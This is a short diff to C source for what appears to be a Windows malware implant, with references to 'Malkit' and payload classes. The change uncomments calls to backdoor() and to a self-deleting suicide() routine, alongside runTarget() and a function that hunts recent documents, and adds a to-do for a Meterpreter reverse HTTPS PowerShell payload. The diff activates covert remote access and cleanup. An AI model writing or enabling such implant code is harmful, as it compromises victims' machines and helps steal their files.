@@ -24,6 +24,7 @@
  */
 
 // @todo: Add modules used here to Malkit, Utils and Payload classes
+// @todo: Meterpreter Reverse HTTPS powershell payload
 
 #define INITGUID
 
@@ -301,7 +302,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	
 	CoInitialize(_null_);
 	
-	// backdoor();
+	backdoor();
 	
 	runTarget();
 	
@@ -332,7 +333,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 		huntRecentDocs();
 	}
 	
-	// suicide();
+	suicide();
 	
 	return EXIT_SUCCESS;
 }
